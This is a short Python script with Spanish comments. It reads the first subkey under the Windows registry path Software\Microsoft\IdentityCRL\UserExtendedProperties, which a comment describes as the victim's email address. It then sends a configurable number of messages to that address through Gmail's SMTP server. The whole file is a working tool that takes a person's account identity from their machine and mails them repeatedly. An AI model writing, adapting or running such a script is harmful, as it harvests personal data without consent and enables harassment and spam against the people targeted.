import winreg
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def obtener_primera_carpeta_registro(ruta_clave):
    try:
        # Abre la clave del Registro en modo de solo lectura
        clave = winreg.OpenKey(winreg.HKEY_CURRENT_USER, ruta_clave, 0, winreg.KEY_READ)
        
        # Inicializa el contador
        indice = 0
        
        while True:
            try:
                # Enumera las subclaves
                subclave = winreg.EnumKey(clave, indice)
                winreg.CloseKey(clave)  # Cierra la clave antes de devolver el resultado
                return subclave
            except OSError:
                # No hay más subclaves
                break
        
        winreg.CloseKey(clave)
        
        return None

    except FileNotFoundError:
        print(f"La clave del Registro no se encontró: {ruta_clave}")
        return None
    except PermissionError:
        print(f"Permiso denegado para acceder a la clave del Registro: {ruta_clave}")
        return None

def send_email(from_email, password, to_email, subject, message):
    # Configurar el servidor SMTP de Gmail
    smtp_server = 'smtp.gmail.com'
    smtp_port = 587

    # Crear un objeto MIMEMultipart para construir el mensaje
    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject

    # Agregar el mensaje al cuerpo del correo electrónico
    msg.attach(MIMEText(message, 'plain'))

    # Iniciar conexión con el servidor SMTP
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()  # Habilitar cifrado TLS
    server.login(from_email, password)  # Autenticarse en el servidor SMTP

    # Enviar el correo electrónico
    server.sendmail(from_email, to_email, msg.as_string())

    # Cerrar conexión con el servidor SMTP
    server.quit()

# Ruta de la clave del Registro a leer
ruta_clave = r"Software\Microsoft\IdentityCRL\UserExtendedProperties"

# Llama a la función y muestra el nombre de la primera carpeta encontrada
primera_carpeta = obtener_primera_carpeta_registro(ruta_clave)



from_email = "nombredelemail con el que quieres enviar correos"
password = "contraseña del email con el que quieres enviar correos"
to_email = primera_carpeta # Email que se obtiene de los registros de la victima
cuerpo = "Cuerpo del correo que vas a enviar"
asunto = "Asunto del correo que vas a enviar"
n = 2 # Numero de emails que quieres enviar

for i in range(n):
    send_email(from_email, password, to_email, asunto, cuerpo)